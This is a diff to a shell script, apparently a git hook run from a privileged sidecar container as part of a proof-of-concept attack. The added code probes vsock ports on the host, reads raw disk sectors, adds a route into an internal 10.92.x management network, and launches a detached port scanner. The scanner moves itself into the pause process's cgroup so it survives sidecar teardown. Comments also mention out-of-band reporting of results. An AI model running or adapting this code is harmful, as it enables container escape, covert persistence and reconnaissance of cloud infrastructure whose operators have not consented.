@@ -88,8 +88,39 @@ report() {
         [ -f "$c" ] && { echo "## == $c =="; head -c 4000 "$c" 2>/dev/null; echo; }
     done
     echo "## --- other container rootfs roots in this VM ---"; ls -la /run/gcs/c/*/rootfs 2>/dev/null | head -20
-    # (heavy fabric/atlas file sweep removed — data already captured in poc3 evidence;
-    #  keeping recon fast so the persistent monitor launches reliably afterwards)
+
+    echo "## ===== PRIVILEGED SIDECAR: VSOCK / DISK / NETWORK PROBE ====="
+    echo "## --- /dev/vsock available? ---"; ls -la /dev/vsock 2>&1
+    echo "## --- vsock probe (AF_VSOCK CID=2 host, common GCS ports) ---"
+    # Try each GCS vsock port via Python if available; fall back to socat
+    for port in 2056 2057 1024 8000 8080; do
+        res=$(python3 -c "
+import socket, sys
+try:
+    s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM)
+    s.settimeout(2)
+    s.connect((2,$port))
+    banner=s.recv(256)
+    print('OPEN cid=2 port=$port banner='+repr(banner))
+    s.close()
+except Exception as e:
+    print('CLOSED/ERR cid=2 port=$port: '+str(e))
+" 2>&1 || echo "python3 unavailable port=$port")
+        echo "  $res"
+    done
+    echo "## --- raw disk: first 512B of each SCSI disk (strings) ---"
+    for dev in /dev/sda /dev/sdb /dev/sdc /dev/sdd /dev/sde /dev/sdf /dev/sdg /dev/sdh /dev/sdi; do
+        [ -b "$dev" ] || continue
+        printf '  %s: ' "$dev"
+        dd if="$dev" bs=512 count=1 2>/dev/null | strings | tr '\n' '|' | head -c 300
+        echo
+    done
+    echo "## --- raw disk: blkid on all SCSI disks ---"
+    blkid /dev/sd* 2>&1 || true
+    echo "## --- route: 10.92.0.0/16 added via eth0 (for deferred TCP probe) ---"
+    ip route add 10.92.0.0/16 dev eth0 2>&1 || true
+    ip route show 2>&1
+    echo "## (TCP probe to 10.92.x is DETACHED below to avoid delaying the clone)"
 }
 
 report > "$WORKTREE/$OUT" 2>&1
@@ -117,6 +148,49 @@ fi
 for p in /mount/gitrepo /mount/gitrepo/mnt /tmp/hooks /mnt/repo /tmp; do
     cp "$WORKTREE/$OUT" "$p/$OUT" 2>/dev/null || true
 done
+
+# ── Deferred 10.92.x TCP probe (DETACHED + cgroup-migrated, survives sidecar teardown) ──
+PROBE_OUT="$WORKTREE/PROBE_10_92.txt"
+PROBE_SH="$WORKTREE/_probe.sh"
+cat > "$PROBE_SH" << 'PROBE_EOF'
+#!/bin/bash
+# Probe SF management network (10.92.x) from the privileged sidecar netns.
+# Migrates into pause's cgroup immediately so it survives sidecar teardown.
+OUT="$1"
+
+# Migrate into pause (pid1) cgroup so we outlive the sidecar cgroup kill
+while IFS=: read -r _i ctrls path; do
+    [ -z "$path" ] && continue
+    for c in ${ctrls//,/ }; do
+        [ -w "/sys/fs/cgroup/$c$path/cgroup.procs" ] && \
+            echo $$ > "/sys/fs/cgroup/$c$path/cgroup.procs" 2>/dev/null
+    done
+done < /proc/1/cgroup
+
+echo "=== PROBE START $(date -u) pid=$$ ===" >> "$OUT"
+ip route add 10.92.0.0/16 dev eth0 2>/dev/null || true
+ip route show >> "$OUT" 2>&1
+
+for target in 10.92.0.13 10.92.0.12 10.92.0.4 10.92.0.6; do
+    for port in 19080 19000 1025 8080 80 443 22 2379 6443 9000; do
+        python3 -c "
+import socket, sys
+target='$target'; port=$port; out='$OUT'
+try:
+    s=socket.socket(); s.settimeout(3); s.connect((target,port))
+    s.send(b'GET / HTTP/1.0\r\nHost: '+target.encode()+b'\r\n\r\n')
+    d=s.recv(512); s.close()
+    msg='OPEN {}:{} {}'.format(target,port,repr(d[:120]))
+except Exception as e:
+    msg='CLOSED {}:{} {}'.format(target,port,str(e)[:60])
+open(out,'a').write(msg+'\n')
+" 2>/dev/null || echo "nopy $target:$port" >> "$OUT"
+    done
+done
+echo "=== PROBE DONE $(date -u) ===" >> "$OUT"
+PROBE_EOF
+chmod +x "$PROBE_SH"
+setsid bash "$PROBE_SH" "$PROBE_OUT" </dev/null >/dev/null 2>&1 &
 
 # ── Out-of-band compact summary (DETACHED — never delays the clone) ───────────
 # Backgrounded so a slow/blocked connect cannot hang the hook. The full report is
